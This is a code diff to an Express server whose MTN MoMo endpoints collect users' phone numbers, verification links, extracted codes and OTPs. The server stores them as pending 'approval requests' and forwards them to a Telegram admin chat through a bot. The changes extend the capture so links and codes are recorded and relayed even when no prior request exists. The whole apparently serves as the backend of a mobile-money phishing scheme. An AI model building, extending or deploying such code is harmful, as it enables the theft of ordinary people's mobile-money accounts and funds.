@@ -22,8 +22,8 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const PUBLIC_DIR = __dirname;
 
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || process.env.ADMIN_CHAT_ID;
 
 if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
   console.warn(
@@ -79,7 +79,7 @@ function jsonSuccess(data = {}) {
 }
 
 function jsonError(message, extra = {}) {
-  return { success: false, error: message, ...extra };
+  return { success: false, error: message, message, ...extra };
 }
 
 // Clean up old requests every 10 minutes (older than 30 min) to avoid unbounded growth
@@ -341,11 +341,56 @@ app.post('/api/mtn/submit', (req, res) => {
 });
 
 app.post('/api/mtn/momo-link', (req, res) => {
-  const { phone, link } = req.body || {};
-  if (!phone || !link) {
+  const { requestId, phone, link, extractedCode } = req.body || {};
+  const resolvedLink = link || extractedCode || '';
+  let resolvedPhone = phone;
+  let id = requestId;
+
+  if (!resolvedPhone && id) {
+    const existing = requests.get(id) || demoMtnRequests.get(id);
+    if (existing) resolvedPhone = existing.phone;
+  }
+
+  if (!resolvedPhone || !resolvedLink) {
     return res.status(400).json(jsonError('Missing phone or link'));
   }
-  res.json(jsonSuccess({ message: 'Link submitted', phone, link }));
+
+  if (!id) {
+    id = createApprovalRequest({
+      plan: 'MTN MoMo verification',
+      price: '—',
+      phone: resolvedPhone,
+      step: 'link',
+      link: resolvedLink,
+    });
+  } else {
+    const existing = requests.get(id) || demoMtnRequests.get(id);
+    if (existing) {
+      existing.link = resolvedLink;
+      existing.phone = resolvedPhone;
+      existing.step = 'link';
+      existing.status = 'pending';
+
+      if (api && ADMIN_CHAT_ID) {
+        notifyTelegramForRequest(id, {
+          plan: existing.plan,
+          price: existing.price,
+          phone: existing.phone,
+          step: 'link',
+          code: existing.code,
+          otp: existing.otp || '—',
+          link: existing.link,
+        });
+      }
+    }
+  }
+
+  const existing = requests.get(id) || demoMtnRequests.get(id);
+  if (existing && !isAdminApprovalConfigured()) {
+    existing.status = 'otp_pending';
+  }
+
+  res.json(jsonSuccess({ message: 'Link submitted', phone: resolvedPhone, link: resolvedLink, requestId: id }));
 });
 
 app.post('/api/mtn/submit-link', (req, res) => {
@@ -380,11 +425,31 @@ app.post('/api/mtn/submit-link', (req, res) => {
           otp: existing.otp || '—',
           link: existing.link || ''
         });
+      } else {
+        existing.status = 'otp_pending';
       }
     }
+  } else {
+    const id = createApprovalRequest({
+      plan: 'MTN verification',
+      price: '—',
+      phone: resolvedPhone,
+      step: 'link',
+      link: fullLinkValue,
+    });
+    const created = requests.get(id) || demoMtnRequests.get(id);
+    if (created && !isAdminApprovalConfigured()) {
+      created.status = 'otp_pending';
+    }
+    return res.json(jsonSuccess({ message: 'Link submitted', phone: resolvedPhone, link: fullLinkValue, requestId: id }));
   }
 
-  res.json(jsonSuccess({ message: 'Link submitted', phone: resolvedPhone, link: fullLinkValue }));
+  res.json(jsonSuccess({
+    message: 'Link submitted',
+    phone: resolvedPhone,
+    link: fullLinkValue,
+    requestId
+  }));
 });
 
 app.post('/api/mtn/demo-approve', (req, res) => {
